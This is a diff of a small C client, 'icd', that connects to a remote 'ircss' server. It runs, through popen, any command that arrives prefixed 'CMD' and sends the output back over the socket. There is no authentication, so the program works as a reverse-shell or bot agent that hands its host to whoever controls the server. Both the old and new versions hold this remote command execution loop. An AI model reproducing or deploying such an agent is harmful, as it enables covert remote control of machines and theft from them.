@@ -21,35 +21,25 @@
 #include <getopt.h>
 #include <limits.h>
 #include <string.h>
-#include <search.h>
-#include "icd.h"
-#include "sock.h"
-
-#include <unistd.h>
-#include <errno.h>
 #include <netdb.h>
-#include <sys/types.h>
 #include <netinet/in.h>
 #include <sys/socket.h>
-
-
-#define MAXDATASIZE 256
-
-#define MAX_BUF 256
+#include "core.h"
+#include "sock.h"
 
 void print_version() {
-  printf("icd v0.1.0\n");
+  printf("icd v0.1.1\n");
   exit(EXIT_SUCCESS);
 }
 
 void print_help() {
-  printf("Usage: icd -[hv] [-p PORT -a ADDRESS]\n");
+  printf("Usage: icd -[hv] -a ADDRESS -p PORT\n");
   printf("\n");
   printf("Options:\n");
-  printf("  -p, --port=PORT port number on the ircss server\n");
   printf("  -a, --address=ADDRESS ipv4/6 address of the ircss server\n");
-  printf("  -h, --help        display this screen\n");
-  printf("  -v, --version     display version\n");
+  printf("  -p, --port=PORT       port number on the ircss server\n");
+  printf("  -h, --help            display this screen\n");
+  printf("  -v, --version         display version\n");
   exit(EXIT_SUCCESS);
 }
 
@@ -66,8 +56,6 @@ int main(int argc, char **argv) {
   char *port, *address, str[LINE_MAX] = "", *ret;
   extern char *optarg;
   extern int optind;
-  pthread_t pt_irc, pt_ss;
-  int irc_port, ss_port;
   
   while (1) {
     int option_index = 0;
@@ -105,95 +93,44 @@ int main(int argc, char **argv) {
   /*real code starts here*/
   if (port == NULL || address == NULL) print_help();
 
-  int sockfd, numbytes, rv;
-  char buf[MAXDATASIZE];
-  struct addrinfo hints, *servinfo, *p;
-  char s[INET6_ADDRSTRLEN];
+  int conn_sockfd, err;
+  char buf[MAX_BUF + 1];
 
-  memset(&hints, 0, sizeof hints);
-  hints.ai_family = AF_UNSPEC;
-  hints.ai_socktype = SOCK_STREAM;
-  
-  /* this does stuff */
-  if ((rv = getaddrinfo(address, port, &hints, &servinfo)) != 0) {
-    fprintf(stderr, "getaddrinfo: %s\n", gai_strerror(rv));
-    return 1;
-  }
-  
-  /*loop through all the results and connect ot the first possible*/
-  for (p = servinfo; p != NULL; p = p->ai_next) {
-    if ((sockfd = socket(p->ai_family, p->ai_socktype, p->ai_protocol)) == -1) {
-      perror("client: socket");
-      continue;
-    }
-  
-    if (connect(sockfd, p-> ai_addr, p->ai_addrlen) == -1) {
-      close(sockfd);
-      perror("client: connect");
-      continue;
-    }
- 
-    break;
-  }
- 
-  if (p == NULL) {
-    fprintf(stderr, "client: failed to connect\n");
-    return 2;
-  }
-
-  inet_ntop(p->ai_family, get_in_addr((struct sockaddr *)p->ai_addr), s, sizeof s);
-  printf("client: connected to %s\n", s);
-  
-  freeaddrinfo(servinfo); //dont need servinfo anymore
+  conn_sockfd = get_conn_sock(address, atoi(port));
 
   while (1) {
-    char * pch;
+    memset(&buf, 0, sizeof(buf));
+    err = read(conn_sockfd, buf, MAX_BUF);
+    if (err == -1) error("ERROR on read");
+    else if (err == 0) break;
+    char *tok;
 
-    numbytes = recv(sockfd, buf, MAXDATASIZE - 1, 0);
-    if (numbytes == -1) error("ERROR on recv");
-    else if (numbytes == 0) break;
+    tok = strtok(buf, " ");
 
-    buf[numbytes] = '\0';
-   
-    if (DEBUG == 1)
-      printf("client: received %s\n", buf);
+    if (strcmp(tok, "CMD") == 0) {
+      tok = strtok(NULL, "\r\n");
+      FILE *fp;
+      int status, err;
+      char line[MAX_BUF + 1];
+      char msg[MAX_BUF + 5];
 
-    pch = strtok(buf, " ");
+      fp = popen(tok, "r");
+      if (fp == NULL) error("ERROR: popen");
 
-    while (pch != NULL) {
-      if (strcmp(pch, "CMD") == 0) {
-        pch = strtok(NULL, "\r\n");
-        //system(pch);
-        FILE *fp;
-        int status, err;
-        char line[MAX_BUF + 1];
-        char str[MAX_BUF + 5];
+      while (fgets(line, MAX_BUF, fp) != NULL) {
+        strcpy(msg, "MSG ");
+        strcat(msg, line);
+        err = write(conn_sockfd, msg, strlen(msg)); 
+        if (err == -1) error("ERROR on write");
+      }
 
-        fp = popen(pch, "r");
-        if (fp == NULL) error("ERROR: popen");
-
-        while (fgets(line, MAX_BUF, fp) != NULL) {
-          strcpy(str, "MSG ");
-          strcat(str, line);
-          err = write(sockfd, str, strlen(str)); 
-          if (err == -1) error("ERROR on write");
-        }
-
-        status = pclose(fp);
-        if (status == -1) error("ERROR: pclose");
-      }       
-      
-      break;
-      //pch = strok(NULL, " ");
-      
-    }
-    
+      status = pclose(fp);
+      if (status == -1) error("ERROR on pclose");
+    }       
   }
 
-  close(sockfd);
+  close(conn_sockfd);
 
-  return 0;
- 
-  //exit(EXIT_SUCCESS);
+  exit(EXIT_SUCCESS);
 }
 
